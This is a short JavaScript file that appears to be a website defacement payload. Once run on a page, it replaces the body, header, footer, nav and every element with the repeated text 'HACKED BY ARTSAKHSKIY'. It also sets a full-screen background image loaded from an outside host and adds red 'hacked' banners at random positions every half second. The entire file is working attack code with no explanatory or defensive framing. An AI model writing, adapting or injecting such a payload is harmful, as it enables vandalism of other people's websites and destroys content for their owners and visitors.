(function () {
    const body = document.body, bodyChildren = document.querySelectorAll('body'); bodyChildren.forEach((element) => { element.innerHTML = "Hacked By Artsakhskiy"; element.style.fontWeight = "bold"; element.style.color = "black!important"; element.style.fontSize = "40px"; });
    body.style.background = 'url("https://i.pinimg.com/originals/d0/52/00/d05200200dc4c9a9dfa0dca9fb9fbdb5.jpg"), black'; body.style.backgroundPosition = 'center'; body.style.backgroundRepeat = 'no-repeat'; body.style.backgroundSize = 'cover'; body.style.backgroundAttachment = 'fixed'; body.style.zIndex = '999999'; body.style.position = 'fixed'; body.style.margin = '0'; body.style.padding = '0'; body.style.left = '0'; body.style.top = '0'; body.style.width = '100%'; body.style.height = '100%'; body.style.overflow = 'hidden';
    document.querySelector('footer').innerHTML = 'HACKED BY ARTSAKHSKIY'; document.querySelector('header').innerHTML = 'HACKED BY ARTSAKHSKIY'; document.querySelector('nav').innerHTML = 'HACKED BY ARTSAKHSKIY';

    document.querySelectorAll('*').forEach((element) => {
        element.innerHTML = "HACKED BY ARTSAKHSKIY<br>".repeat(50); // Repeat the text 50 times
        element.style.fontWeight = "bold";
        element.style.color = "black";
        element.style.fontSize = "30px";
        element.style.textAlign = "center";
        element.style.fontFamily = "Arial, sans-serif";
    });

    // Change the background
    body.style.background = 'url("https://i.pinimg.com/originals/d0/52/00/d05200200dc4c9a9dfa0dca9fb9fbdb5.jpg"), black';
    body.style.backgroundPosition = 'center';
    body.style.backgroundRepeat = 'no-repeat';
    body.style.backgroundSize = 'cover';
    body.style.backgroundAttachment = 'fixed';
    body.style.margin = '0';
    body.style.padding = '0';
    body.style.width = '100%';
    body.style.height = '100%';
    body.style.overflow = 'hidden';

    // Continuously add text to the page
    setInterval(() => {
        const text = document.createElement("div");
        text.innerHTML = "HACKED BY ARTSAKHSKIY";
        text.style.position = "absolute";
        text.style.left = Math.random() * window.innerWidth + "px";
        text.style.top = Math.random() * window.innerHeight + "px";
        text.style.color = "red";
        text.style.fontSize = "50px";
        text.style.fontWeight = "bold";
        text.style.fontFamily = "Arial, sans-serif";
        text.style.zIndex = "9999";
        body.appendChild(text);
    }, 500); // Adds text every 500ms
}());
